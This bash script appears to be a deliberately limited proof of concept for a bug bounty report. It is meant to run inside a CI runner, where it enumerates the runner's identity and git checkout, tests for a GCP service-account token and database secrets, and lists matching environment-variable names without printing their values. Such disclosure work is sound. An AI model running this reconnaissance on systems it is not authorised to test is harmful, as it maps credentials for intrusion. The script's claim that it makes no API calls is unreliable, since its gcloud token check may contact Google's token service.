#! /bin/bash
# ============================================================
# TIER 1 — BENIGN DIAGNOSTIC MARKERS
# VRP Issue 565274672 — Requested by Google Bug Hunter Team
# ============================================================
# What: Prints runner identity, checks token/secret PRESENCE
# Safety: exit 1 before any real operation
# Risk: ZERO — no credentials extracted, no API calls made
# ============================================================
set -x

echo "=========================================="
echo "VRP_POC [TIER 1 — BENIGN MARKERS]"
echo "=========================================="

# --- Runner Identity ---
echo "VRP_RUNNER_USER: $(whoami)"
echo "VRP_RUNNER_HOSTNAME: $(hostname)"
echo "VRP_RUNNER_OS: $(uname -a)"
echo "VRP_RUNNER_KERNEL: $(uname -r)"
echo "VRP_RUNNER_UPTIME: $(uptime 2>/dev/null || echo 'unknown')"
echo "VRP_WORKING_DIR: $(pwd)"
echo "VRP_HOME_DIR: $HOME"
echo "VRP_RUNNER_ID: $(cat /etc/hostname 2>/dev/null || hostname)"

# --- Git / Checkout Info ---
echo "VRP_CHECKOUT_REPO: $(git remote get-url origin 2>/dev/null || echo 'unknown')"
echo "VRP_CHECKOUT_SHA: $(git rev-parse HEAD 2>/dev/null || echo 'unknown')"
echo "VRP_CHECKOUT_BRANCH: $(git branch --show-current 2>/dev/null || echo 'unknown')"
echo "VRP_GIT_LOG_HEAD: $(git log --oneline -1 2>/dev/null || echo 'unknown')"

# --- GCP Token Presence (NO extraction) ---
if command -v gcloud &>/dev/null; then
    echo "VRP_GCLOUD_INSTALLED: YES"
    if gcloud auth print-access-token >/dev/null 2>&1; then
        echo "VRP_SA_TOKEN_PRESENT: YES (token NOT extracted)"
        echo "VRP_SA_ACCOUNT: $(gcloud config get-value account 2>/dev/null || echo 'unknown')"
        echo "VRP_GCP_PROJECT: $(gcloud config get-value project 2>/dev/null || echo 'unknown')"
    else
        echo "VRP_SA_TOKEN_PRESENT: NO — gcloud auth failed"
    fi
else
    echo "VRP_GCLOUD_INSTALLED: NO"
fi

# --- Secret Manager Values Presence (NO extraction) ---
if [ -n "${DB_PASS:-}" ]; then
    echo "VRP_DB_PASS_PRESENT: YES (${#DB_PASS} chars — value NOT logged)"
else
    echo "VRP_DB_PASS_PRESENT: NO"
fi

if [ -n "${DB_USER:-}" ]; then
    echo "VRP_DB_USER_PRESENT: YES (${#DB_USER} chars — value NOT logged)"
else
    echo "VRP_DB_USER_PRESENT: NO"
fi

if [ -n "${ALLOYDB_CONNECTION_NAME:-}" ]; then
    echo "VRP_ALLOYDB_CONN_PRESENT: YES (value NOT logged)"
else
    echo "VRP_ALLOYDB_CONN_PRESENT: NO"
fi

if [ -n "${ALLOYDB_INSTANCE_NAME:-}" ]; then
    echo "VRP_ALLOYDB_INSTANCE_PRESENT: YES (value NOT logged)"
else
    echo "VRP_ALLOYDB_INSTANCE_PRESENT: NO"
fi

# --- Environment Variable Count (names only, no values) ---
echo "VRP_ENV_VAR_COUNT: $(env | wc -l)"
echo "VRP_ENV_NAMES_WITH_ALLOYDB: $(env | grep -i alloydb | cut -d= -f1 | tr '\n' ', ')"
echo "VRP_ENV_NAMES_WITH_DB: $(env | grep -i '^DB_' | cut -d= -f1 | tr '\n' ', ')"
echo "VRP_ENV_NAMES_WITH_GOOGLE: $(env | grep -i google | cut -d= -f1 | tr '\n' ', ')"
echo "VRP_ENV_NAMES_WITH_GCP: $(env | grep -i gcp | cut -d= -f1 | tr '\n' ', ')"
echo "VRP_ENV_NAMES_GITHUB: $(env | grep -i '^GITHUB_' | cut -d= -f1 | tr '\n' ', ')"

echo "=========================================="
echo "VRP_TIER1_COMPLETE: No credentials extracted. No API calls made."
echo "=========================================="

exit 1
